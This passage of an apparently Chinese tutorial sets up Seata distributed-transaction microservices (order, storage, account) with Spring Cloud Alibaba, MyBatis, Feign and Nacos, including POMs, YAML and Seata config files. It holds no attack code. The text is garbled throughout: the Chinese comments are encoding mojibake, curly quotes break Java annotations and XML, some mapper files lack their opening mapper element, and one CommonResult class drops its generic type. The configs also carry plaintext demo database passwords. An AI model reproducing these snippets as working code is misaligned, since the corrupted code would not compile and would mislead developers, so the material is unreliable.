com.kayleh.springcloud.alibaba.domain.Order; import org.apache.ibatis.annotations.Mapper; import org.apache.ibatis.annotations.Param; @Mapper public interface OrderDao { //æ–°å»ºè®¢å• void create(Order order); //ä¿®æ”¹è®¢å•çŠ¶æ€ï¼Œä»é›¶æ”¹ä¸º1 void update(@Param(&quot;userId&quot;) Long userId,@Param(&quot;status&quot;) Integer status); } resourcesæ–‡ä»¶å¤¹ä¸‹æ–°å»ºmapperæ–‡ä»¶å¤¹åæ·»åŠ  OrderMapper.xml ```xml&lt;?xml version=â€1.0â€ encoding=â€UTF-8â€ ?&gt;&lt;!DOCTYPE mapper PUBLIC â€œ-//mybatis.org//DTD Mapper 3.0//ENâ€ â€œhttp://mybatis.org/dtd/mybatis-3-mapper.dtdâ€œ &gt; &lt;resultMap id=&quot;BaseResultMap&quot; type=&quot;com.kayleh.springcloud.alibaba.domain.Order&quot;&gt; &lt;id column=&quot;id&quot; property=&quot;id&quot; jdbcType=&quot;BIGINT&quot;/&gt; &lt;result column=&quot;user_id&quot; property=&quot;userId&quot; jdbcType=&quot;BIGINT&quot;/&gt; &lt;result column=&quot;product_id&quot; property=&quot;productId&quot; jdbcType=&quot;BIGINT&quot;/&gt; &lt;result column=&quot;count&quot; property=&quot;count&quot; jdbcType=&quot;INTEGER&quot;/&gt; &lt;result column=&quot;money&quot; property=&quot;money&quot; jdbcType=&quot;DECIMAL&quot;/&gt; &lt;result column=&quot;status&quot; property=&quot;status&quot; jdbcType=&quot;INTEGER&quot;/&gt; &lt;/resultMap&gt; &lt;insert id=&quot;create&quot;&gt; insert into t_order (id,user_id,product_id,count,money,status) values (null,#{userId},#{productId},#{count},#{money},0); &lt;/insert&gt; &lt;update id=&quot;update&quot;&gt; update t_order set status = 1 where user_id=#{userId} and status = #{status}; &lt;/update&gt; &lt;/mapper&gt; 8.Serviceæ¥å£åŠå®ç° - OrderService ```java package com.kayleh.springcloud.alibaba.service; import com.kayleh.springcloud.alibaba.domain.Order; public interface OrderService{ void create(Order order); } OrderServiceImpl ```javapackage com.kayleh.springcloud.alibaba.service.impl; import com.kayleh.springcloud.alibaba.dao.OrderDao;import com.kayleh.springcloud.alibaba.domain.Order;import com.kayleh.springcloud.alibaba.service.AccountService;import com.kayleh.springcloud.alibaba.service.OrderService;import com.kayleh.springcloud.alibaba.service.StorageService;import io.seata.spring.annotation.GlobalTransactional;import lombok.extern.slf4j.Sl f4j;import org.springframework.stereotype.Service; import javax.annotation.Resource; @Service@Slf4jpublic class OrderServiceImpl implements OrderService{ @Resource private OrderDao orderDao; @Resource private StorageService storageService; @Resource private AccountService accountService; /** * åˆ›å»ºè®¢å•-&gt;è°ƒç”¨åº“å­˜æœåŠ¡æ‰£å‡åº“å­˜-&gt;è°ƒç”¨è´¦æˆ·æœåŠ¡æ‰£å‡è´¦æˆ·ä½™é¢-&gt;ä¿®æ”¹è®¢å•çŠ¶æ€ */ @Override @GlobalTransactional(name = &quot;fsp-create-order&quot;,rollbackFor = Exception.class) public void create(Order order){ log.info(&quot;-----&gt;å¼€å§‹æ–°å»ºè®¢å•&quot;); //æ–°å»ºè®¢å• orderDao.create(order); //æ‰£å‡åº“å­˜ log.info(&quot;-----&gt;è®¢å•å¾®æœåŠ¡å¼€å§‹è°ƒç”¨åº“å­˜ï¼Œåšæ‰£å‡Count&quot;); storageService.decrease(order.getProductId(),order.getCount()); log.info(&quot;-----&gt;è®¢å•å¾®æœåŠ¡å¼€å§‹è°ƒç”¨åº“å­˜ï¼Œåšæ‰£å‡end&quot;); //æ‰£å‡è´¦æˆ· log.info(&quot;-----&gt;è®¢å•å¾®æœåŠ¡å¼€å§‹è°ƒç”¨è´¦æˆ·ï¼Œåšæ‰£å‡Money&quot;); accountService.decrease(order.getUserId(),order.getMoney()); log.info(&quot;-----&gt;è®¢å•å¾®æœåŠ¡å¼€å§‹è°ƒç”¨è´¦æˆ·ï¼Œåšæ‰£å‡end&quot;); //ä¿®æ”¹è®¢å•çŠ¶æ€ï¼Œä»é›¶åˆ°1ä»£è¡¨å·²ç»å®Œæˆ log.info(&quot;-----&gt;ä¿®æ”¹è®¢å•çŠ¶æ€å¼€å§‹&quot;); orderDao.update(order.getUserId(),0); log.info(&quot;-----&gt;ä¿®æ”¹è®¢å•çŠ¶æ€ç»“æŸ&quot;); log.info(&quot;-----&gt;ä¸‹è®¢å•ç»“æŸäº†&quot;); } } ``` StorageService ```javapackage com.kayleh.springcloud.alibaba.service; import com.kayleh.springcloud.alibaba.domain.CommonResult;import org.springframework.cloud.openfeign.FeignClient;import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.RequestParam; import java.math.BigDecimal; @FeignClient(value = â€œseata-storage-serviceâ€) public interface StorageService{ @PostMapping(value = â€œ/storage/decreaseâ€) CommonResult decrease(@RequestParam(â€œproductIdâ€) Long productId, @RequestParam(â€œcountâ€) Integer count); } - AccountService ```java package com.kayleh.springcloud.alibaba.service; import com.kayleh.springcloud.alibaba.domain.CommonResult; import org.springframework.cloud.openfeign.FeignClient; import org.springframework.web.bind.annotation.PostMapping; import org.springframework.web.bind.annotation.RequestParam; import java.math.BigDecimal; @FeignClient(value = &quot;seata-account-service&quot;) public interface AccountService{ @PostMapping(value = &quot;/account/decrease&quot;) CommonResult decrease(@RequestParam(&quot;userId&quot;) Long userId, @RequestParam(&quot;money&quot;) BigDecimal money); } 9.Controller package com.kayleh.springcloud.alibaba.controller; import com.kayleh.springcloud.alibaba.domain.CommonResult; import com.kayleh.springcloud.alibaba.domain.Order; import com.kayleh.springcloud.alibaba.service.OrderService; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; import javax.annotation.Resource; @RestController public class OrderController{ @Resource private OrderService orderService; @GetMapping(&quot;/order/create&quot;) public CommonResult create(Order order) { orderService.create(order); return new CommonResult(200,&quot;è®¢å•åˆ›å»ºæˆåŠŸ&quot;); } } 10.Configé…ç½® MyBatisConfig ```javapackage com.kayleh.springcloud.alibaba.config; import org.mybatis.spring.annotation.MapperScan;import org.springframework.context.annotation.Configuration; @Configuration @MapperScan({â€œcom.kayleh.springcloud.alibaba.daoâ€}) public class MyBatisConfig { } - DataSourceProxyConfig ```java package com.kayleh.springcloud.alibaba.config; import com.alibaba.druid.pool.DruidDataSource; import io.seata.rm.datasource.DataSourceProxy; import org.apache.ibatis.session.SqlSessionFactory; import org.mybatis.spring.SqlSessionFactoryBean; import org.mybatis.spring.transaction.SpringManagedTransactionFactory; import org.springframework.beans.factory.annotation.Value; import org.springframework.boot.context.properties.ConfigurationProperties; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.core.io.support.PathMatchingResourcePatternResolver; import javax.sql.DataSource; @Configuration public class DataSourceProxyConfig { @Value(&quot;${mybatis.mapperLocations}&quot;) private String mapperLocations; @Bean @ConfigurationProperties(prefix = &quot;spring.datasource&quot;) public DataSource druidDataSource(){ return new DruidDataSource(); } @Bean public DataSourceProxy dataSourceProxy(DataSource dataSource) { return new DataSourceProxy(dataSource); } @Bean public SqlSessionFactory sqlSessionFactoryBean(DataSourceProxy dataSourceProxy) throws Exception { SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean(); sqlSessionFactoryBean.setDataSource(dataSourceProxy); sqlSessionFactoryBean.setMapperLocations(new PathMatchingResourcePatternResolver().getResources(mapperLocations)); sqlSessionFactoryBean.setTransactionFactory(new SpringManagedTransactionFactory()); return sqlSessionFactoryBean.getObject(); } } 11.ä¸»å¯åŠ¨ package com.kayleh.springcloud.alibaba; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; import org.springframework.cloud.openfeign.EnableFeignClients; @EnableDiscoveryClient @EnableFeignClients @SpringBootApplication(exclude = DataSourceAutoConfiguration.class)//å–æ¶ˆæ•°æ®æºè‡ªåŠ¨åˆ›å»ºçš„é…ç½® public class SeataOrderMainApp2001{ public static void main(String[] args) { SpringApplication.run(SeataOrderMainApp2001.class, args); } } æ–°å»ºåº“å­˜Storage-Module1.seata-order-service2002 2.POM &lt;dependencies&gt; &lt;!--nacos--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--seata--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-seata&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;seata-all&lt;/artifactId&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-all&lt;/artifactId&gt; &lt;version&gt;0.9.0&lt;/version&gt; &lt;/dependency&gt; &lt;!--feign--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.0.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.37&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.10&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 3.YML server: port: 2002 spring: application: name: seata-storage-service cloud: alibaba: seata: tx-service-group: fsp_tx_group nacos: discovery: server-addr: localhost:8848 datasource: driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://localhost:3306/seata_storage username: root password: 111111 logging: level: io: seata: info mybatis: mapperLocations: classpath:mapper/*.xml 4.file.conf transport { # tcp udt unix-domain-socket type = &quot;TCP&quot; #NIO NATIVE server = &quot;NIO&quot; #enable heartbeat heartbeat = true #thread factory for netty thread-factory { boss-thread-prefix = &quot;NettyBoss&quot; worker-thread-prefix = &quot;NettyServerNIOWorker&quot; server-executor-thread-prefix = &quot;NettyServerBizHandler&quot; share-boss-worker = false client-selector-thread-prefix = &quot;NettyClientSelector&quot; client-selector-thread-size = 1 client-worker-thread-prefix = &quot;NettyClientWorkerThread&quot; # netty boss thread size,will not be used for UDT boss-thread-size = 1 #auto default pin or 8 worker-thread-size = 8 } shutdown { # when destroy server, wait seconds wait = 3 } serialization = &quot;seata&quot; compressor = &quot;none&quot; } service { #vgroup-&gt;rgroup vgroup_mapping.fsp_tx_group = &quot;default&quot; #only support single node default.grouplist = &quot;127.0.0.1:8091&quot; #degrade current not support enableDegrade = false #disable disable = false #unit ms,s,m,h,d represents milliseconds, seconds, minutes, hours, days, default permanent max.commit.retry.timeout = &quot;-1&quot; max.rollback.retry.timeout = &quot;-1&quot; disableGlobalTransaction = false } client { async.commit.buffer.limit = 10000 lock { retry.internal = 10 retry.times = 30 } report.retry.count = 5 tm.commit.retry.count = 1 tm.rollback.retry.count = 1 } transaction { undo.data.validation = true undo.log.serialization = &quot;jackson&quot; undo.log.save.days = 7 #schedule delete expired undo_log in milliseconds undo.log.delete.period = 86400000 undo.log.table = &quot;undo_log&quot; } support { ## spring spring { # auto proxy the DataSource bean datasource.autoproxy = false } } 5.registry.conf registry { # file ã€nacos ã€eurekaã€redisã€zk type = &quot;nacos&quot; nacos { serverAddr = &quot;localhost:8848&quot; namespace = &quot;&quot; cluster = &quot;default&quot; } eureka { serviceUrl = &quot;http://localhost:8761/eureka&quot; application = &quot;default&quot; weight = &quot;1&quot; } redis { serverAddr = &quot;localhost:6381&quot; db = &quot;0&quot; } zk { cluster = &quot;default&quot; serverAddr = &quot;127.0.0.1:2181&quot; session.timeout = 6000 connect.timeout = 2000 } file { name = &quot;file.conf&quot; } } config { # fileã€nacos ã€apolloã€zk type = &quot;file&quot; nacos { serverAddr = &quot;localhost&quot; namespace = &quot;&quot; cluster = &quot;default&quot; } apollo { app.id = &quot;fescar-server&quot; apollo.meta = &quot;http://192.168.1.204:8801&quot; } zk { serverAddr = &quot;127.0.0.1:2181&quot; session.timeout = 6000 connect.timeout = 2000 } file { name = &quot;file.conf&quot; } } 6.domain CommonResult package com.kayleh.springcloud.alibaba.domain; import lombok.AllArgsConstructor; import lombok.Data; import lombok.NoArgsConstructor; @Data @AllArgsConstructor @NoArgsConstructor public class CommonResult&lt;T&gt; { private Integer code; private String message; private T data; public CommonResult(Integer code, String message) { this(code,message,null); } } Storage ```javapackage com.kayleh.springcloud.alibaba.domain; import lombok.Data; @Datapublic class Storage { private Long id; // äº§å“id private Long productId; //æ€»åº“å­˜ private Integer total; //å·²ç”¨åº“å­˜ private Integer used; //å‰©ä½™åº“å­˜ private Integer residue; } 7.Daoæ¥å£åŠå®ç° - StorageDao ```java package com.kayleh.springcloud.alibaba.dao; import org.apache.ibatis.annotations.Mapper; import org.apache.ibatis.annotations.Param; @Mapper public interface StorageDao { //æ‰£å‡åº“å­˜ä¿¡æ¯ void decrease(@Param(&quot;productId&quot;) Long productId, @Param(&quot;count&quot;) Integer count); } resourcesæ–‡ä»¶å¤¹ä¸‹æ–°å»ºmapperæ–‡ä»¶å¤¹åæ·»åŠ  StorageMapper.xml ```xml&lt;?xml version=â€1.0â€ encoding=â€UTF-8â€ ?&gt;&lt;!DOCTYPE mapper PUBLIC â€œ-//mybatis.org//DTD Mapper 3.0//ENâ€ â€œhttp://mybatis.org/dtd/mybatis-3-mapper.dtdâ€œ &gt; &lt;resultMap id=&quot;BaseResultMap&quot; type=&quot;com.kayleh.springcloud.alibaba.domain.Storage&quot;&gt; &lt;id column=&quot;id&quot; property=&quot;id&quot; jdbcType=&quot;BIGINT&quot;/&gt; &lt;result column=&quot;product_id&quot; property=&quot;productId&quot; jdbcType=&quot;BIGINT&quot;/&gt; &lt;result column=&quot;total&quot; property=&quot;total&quot; jdbcType=&quot;INTEGER&quot;/&gt; &lt;result column=&quot;used&quot; property=&quot;used&quot; jdbcType=&quot;INTEGER&quot;/&gt; &lt;result column=&quot;residue&quot; property=&quot;residue&quot; jdbcType=&quot;INTEGER&quot;/&gt; &lt;/resultMap&gt; &lt;update id=&quot;decrease&quot;&gt; UPDATE t_storage SET used = used + #{count},residue = residue - #{count} WHERE product_id = #{productId} &lt;/update&gt; &lt;/mapper&gt; 8.Serviceæ¥å£åŠå®ç° - StorageService ```java package com.kayleh.springcloud.alibaba.service; public interface StorageService { // æ‰£å‡åº“å­˜ void decrease(Long productId, Integer count); } StorageServiceImpl package com.kayleh.springcloud.alibaba.service.impl; import com.kayleh.springcloud.alibaba.dao.StorageDao; import com.kayleh.springcloud.alibaba.service.StorageService ; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Service; import javax.annotation.Resource; @Service public class StorageServiceImpl implements StorageService { private static final Logger LOGGER = LoggerFactory.getLogger(StorageServiceImpl.class); @Resource private StorageDao storageDao; // æ‰£å‡åº“å­˜ @Override public void decrease(Long productId, Integer count) { LOGGER.info(&quot;-------&gt;storage-serviceä¸­æ‰£å‡åº“å­˜å¼€å§‹&quot;); storageDao.decrease(productId,count); LOGGER.info(&quot;-------&gt;storage-serviceä¸­æ‰£å‡åº“å­˜ç»“æŸ&quot;); } } 9.Controller package com.kayleh.springcloud.alibaba.controller; import com.kayleh.springcloud.alibaba.domain.CommonResult ; import com.kayleh.springcloud.alibaba.service.StorageService ; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; @RestController public class StorageController { @Autowired private StorageService storageService; //æ‰£å‡åº“å­˜ @RequestMapping(&quot;/storage/decrease&quot;) public CommonResult decrease(Long productId, Integer count) { storageService.decrease(productId, count); return new CommonResult(200,&quot;æ‰£å‡åº“å­˜æˆåŠŸï¼&quot;); } } 10.Configé…ç½® MyBatisConfig ```javapackage com.kayleh.springcloud.alibaba.config; import org.mybatis.spring.annotation.MapperScan;import org.springframework.context.annotation.Configuration; @Configuration @MapperScan({â€œcom.kayleh.springcloud.alibaba.daoâ€}) public class MyBatisConfig { } - DataSourceProxyConfig ```java package com.kayleh.springcloud.alibaba.config; import com.alibaba.druid.pool.DruidDataSource; import io.seata.rm.datasource.DataSourceProxy; import org.apache.ibatis.session.SqlSessionFactory; import org.mybatis.spring.SqlSessionFactoryBean; import org.mybatis.spring.transaction.SpringManagedTransactionFactory; import org.springframework.beans.factory.annotation.Value; import org.springframework.boot.context.properties.ConfigurationProperties; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import org.springframework.core.io.support.PathMatchingResourcePatternResolver; import javax.sql.DataSource; @Configuration public class DataSourceProxyConfig { @Value(&quot;${mybatis.mapperLocations}&quot;) private String mapperLocations; @Bean @ConfigurationProperties(prefix = &quot;spring.datasource&quot;) public DataSource druidDataSource(){ return new DruidDataSource(); } @Bean public DataSourceProxy dataSourceProxy(DataSource dataSource) { return new DataSourceProxy(dataSource); } @Bean public SqlSessionFactory sqlSessionFactoryBean(DataSourceProxy dataSourceProxy) throws Exception { SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean(); sqlSessionFactoryBean.setDataSource(dataSourceProxy); sqlSessionFactoryBean.setMapperLocations(new PathMatchingResourcePatternResolver().getResources(mapperLocations)); sqlSessionFactoryBean.setTransactionFactory(new SpringManagedTransactionFactory()); return sqlSessionFactoryBean.getObject(); } } 11.ä¸»å¯åŠ¨ package com.kayleh.springcloud.alibaba; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration; import org.springframework.cloud.client.discovery.EnableDiscoveryClient; import org.springframework.cloud.openfeign.EnableFeignClients; import java.util.ArrayList; import java.util.Arrays; import java.util.List; import java.util.concurrent.ForkJoinWorkerThread; @SpringBootApplication(exclude = DataSourceAutoConfiguration.class) @EnableDiscoveryClient @EnableFeignClients public class SeataStorageServiceApplication2002 { public static void main(String[] args) { SpringApplication.run(SeataStorageServiceApplication2002.class, args); } } æ–°å»ºè´¦æˆ·Account-Module1.seata-account-service2003 2.POM &lt;dependencies&gt; &lt;!--nacos--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--seata--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-seata&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;seata-all&lt;/artifactId&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-all&lt;/artifactId&gt; &lt;version&gt;0.9.0&lt;/version&gt; &lt;/dependency&gt; &lt;!--feign--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.0.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.37&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.10&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 3.YML server: port: 2003 spring: application: name: seata-account-service cloud: alibaba: seata: tx-service-group: fsp_tx_group nacos: discovery: server-addr: localhost:8848 datasource: driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://localhost:3306/seata_account username: root password: 1111111 feign: hystrix: enabled: false logging: level: io: seata: info mybatis: mapperLocations: classpath:mapper/*.xml 4.file.conf transport { # tcp udt unix-domain-socket type = &quot;TCP&quot; #NIO NATIVE server = &quot;NIO&quot; #enable heartbeat heartbeat = true #thread factory for netty thread-factory { boss-thread-prefix = &quot;NettyBoss&quot; worker-thread-prefix = &quot;NettyServerNIOWorker&quot; server-executor-thread-prefix = &quot;NettyServerBizHandler&quot; share-boss-worker = false client-selector-thread-prefix = &quot;NettyClientSelector&quot; client-selector-thread-size = 1 client-worker-thread-prefix = &quot;NettyClientWorkerThread&quot; # netty boss thread size,will not be used for UDT boss-thread-size = 1 #auto default pin or 8 worker-thread-size = 8 } shutdown { # when destroy server, wait seconds wait = 3 } serialization = &quot;seata&quot; compressor = &quot;none&quot; } service { vgroup_mapping.fsp_tx_group = &quot;default&quot; #ä¿®æ”¹è‡ªå®šä¹‰äº‹åŠ¡ç»„åç§° default.grouplist = &quot;127.0.0.1:8091&quot; enableDegrade = false disable = false max.commit.retry.timeout = &quot;-1&quot; max.rollback.retry.timeout = &quot;-1&quot; disableGlobalTransaction = false } client { async.commit.buffer.limit = 10000 lock { retry.internal = 10 retry.times = 30 } report.retry.count = 5 tm.commit.retry.count = 1 tm.rollback.retry.count = 1 } ## transaction log store store { ## store mode: fileã€db mode = &quot;db&quot; ## file store file { dir = &quot;sessionStore&quot; # branch session size , if exceeded first try compress lockkey, still exceeded throws exceptions max-branch-session-size = 16384 # globe session size , if exceeded throws exceptions max-global-session-size = 512 # file buffer size , if exceeded allocate new buffer file-write-buffer-cache-size = 16384 # when recover batch read size session.reload.read_size = 100 # async, sync flush-disk-mode = async } ## database store db { ## the implement of javax.sql.DataSource, such as DruidDataSource(druid)/BasicDataSource(dbcp) etc. datasource = &quot;dbcp&quot; ## mysql/oracle/h2/oceanbase etc. db-type = &quot;mysql&quot; driver-class-name = &quot;com.mysql.jdbc.Driver&quot; url = &quot;jdbc:mysql://127.0.0.1:3306/seata&quot; user = &quot;root&quot; password = &quot;123456&quot; min-conn = 1 max-conn = 3 global.table = &quot;global_table&quot; branch.table = &quot;branch_table&quot; lock-table = &quot;lock_table&quot; query-limit = 100 } } lock { ## the lock store mode: localã€remote mode = &quot;remote&quot; local { ## store locks in user&#39;s database } remote { ## store locks in the seata&#39;s server } } recovery { #schedule committing retry period in milliseconds committing-retry-period = 1000 #schedule asyn committing retry period in milliseconds asyn-committing-retry-period = 1000 #schedule rollbacking retry period in milliseconds rollbacking-retry-period = 1000 #schedule timeout retry period in milliseconds timeout-retry-period = 1000 } transaction { undo.data.validation = true undo.log.serialization = &quot;jackson&quot; undo.log.save.days = 7 #schedule delete expired undo_log in milliseconds undo.log.delete.period = 86400000 undo.log.table = &quot;undo_log&quot; } ## metrics settings metrics { enabled = false registry-type = &quot;compact&quot; # multi exporters use comma divided exporter-list = &quot;prometheus&quot; exporter-prometheus-port = 9898 } support { ## spring spring { # auto proxy the DataSource bean datasource.autoproxy = false } } 5.registry.conf registry { # file ã€nacos ã€eurekaã€redisã€zkã€consulã€etcd3ã€sofa type = &quot;nacos&quot; nacos { serverAddr = &quot;localhost:8848&quot; namespace = &quot;&quot; cluster = &quot;default&quot; } eureka { serviceUrl = &quot;http://localhost:8761/eureka&quot; application = &quot;default&quot; weight = &quot;1&quot; } redis { serverAddr = &quot;localhost:6379&quot; db = &quot;0&quot; } zk { cluster = &quot;default&quot; serverAddr = &quot;127.0.0.1:2181&quot; session.timeout = 6000 connect.timeout = 2000 } consul { cluster = &quot;default&quot; serverAddr = &quot;127.0.0.1:8500&quot; } etcd3 { cluster = &quot;default&quot; serverAddr = &quot;http://localhost:2379&quot; } sofa { serverAddr = &quot;127.0.0.1:9603&quot; application = &quot;default&quot; region = &quot;DEFAULT_ZONE&quot; datacenter = &quot;DefaultDataCenter&quot; cluster = &quot;default&quot; group = &quot;SEATA_GROUP&quot; addressWaitTime = &quot;3000&quot; } file { name = &quot;file.conf&quot; } } config { # fileã€nacos ã€apolloã€zkã€consulã€etcd3 type = &quot;file&quot; nacos { serverAddr = &quot;localhost&quot; namespace = &quot;&quot; } consul { serverAddr = &quot;127.0.0.1:8500&quot; } apollo { app.id = &quot;seata-server&quot; apollo.meta = &quot;http://192.168.1.204:8801&quot; } zk { serverAddr = &quot;127.0.0.1:2181&quot; session.timeout = 6000 connect.timeout = 2000 } etcd3 { serverAddr = &quot;http://localhost:2379&quot; } file { name = &quot;file.conf&quot; } } 6.domain CommonResult ```javapackage com.kayleh.springcloud.alibaba.domain; import lombok.AllArgsConstructor;import lombok.Data;import lombok.NoArgsConstructor; @Data @AllArgsConstructor @NoArgsConstructor public class CommonResult { private Integer code; private String message; private T data; public CommonResult(Integer code, String message) { this(code,message,null); } } - Account ```java package com.kayleh.springcloud.alibaba.domain; import lombok.AllArgsConstructor; import lombok.Data; import lombok.NoArgsConstructor; import java.math.BigDecimal; @Data @AllArgsConstructor @NoArgsConstructor public class Account { private Long id; /** * ç”¨æˆ·id */ private Long userId; /** * æ€»é¢åº¦ */ private BigDecimal total; /** * å·²ç”¨é¢åº¦ */ private BigDecimal used; /** * å‰©ä½™é¢åº¦ */ private BigDecimal residue; } 7.Daoæ¥å£åŠå®ç° AccountDao package com.kayleh.springcloud.alibaba.dao; import org.apache.ibatis.annotations.Mapper; import org.apache.ibatis.annotations.Param; import org.springframework.stereotype.Component; import org.springframework.stereotype.Repository; import java.math.BigDecimal; @Mapper public interface AccountDao { /** * æ‰£å‡è´¦æˆ·ä½™é¢ */ void decrease(@Param(&quot;userId&quot;) Long userId, @Param(&quot;money&quot;) BigDecimal money); } resourcesæ–‡ä»¶å¤¹ä¸‹æ–°å»ºmapperæ–‡ä»¶å¤¹åæ·»åŠ  AccountMapper.xml &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt; &lt;!DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot; &gt; &lt;mapper namespace=&quot;com.kayleh.springcloud.alibaba.dao.AccountDao&quot;&gt; &lt;resultMap id=&quot;BaseResultMap&quot; type=&quot;com.kayleh.springcloud.alibaba.domain.Account&quot;&gt; &lt;id column=&quot;id&quot; property=&quot;id&quot; jdbcType=&quot;BIGINT&quot;/&gt; &lt;result column=&quot;user_id&quot; property=&quot;userId&quot; jdbcType=&quot;BIGINT&quot;/&gt; &lt;result column=&quot;total&quot; property=&quot;total&quot; jdbcType=&quot;DECIMAL&quot;/&gt; &lt;result column=&quot;used&quot; property=&quot;used&quot; jdbcType=&quot;DECIMAL&quot;/&gt; &lt;result column=&quot;residue&quot; property=&quot;residue&quot; jdbcType=&quot;DECIMAL&quot;/&gt; &lt;/resultMap&gt; &lt;update id=&quot;decrease&quot;&gt; UPDATE t_account SET residue = residue - #{money},used = used + #{money} WHERE user_id = #{userId}; &lt;/update&gt; &lt;/mapper&gt; 8.Serviceæ¥å£åŠå®ç° AccountService ```javapackage com.kayleh.springcloud.alibaba.service; import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.ResponseBody; import java.math.BigDecimal; public interface AccountService { /** * æ‰£å‡è´¦æˆ·ä½™é¢ */ void decrease(@RequestParam(&quot;userId&quot;) Long userId, @RequestParam(&quot;money&quot;) BigDecimal money); } AccountServiceImpl ```java package com.kayleh.springcloud.alibaba.service.impl; import com.kayleh.springcloud.alibaba.dao.AccountDao; import com.kayleh.springcloud.alibaba.service.AccountService ; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Service; import javax.annotation.Resource; import 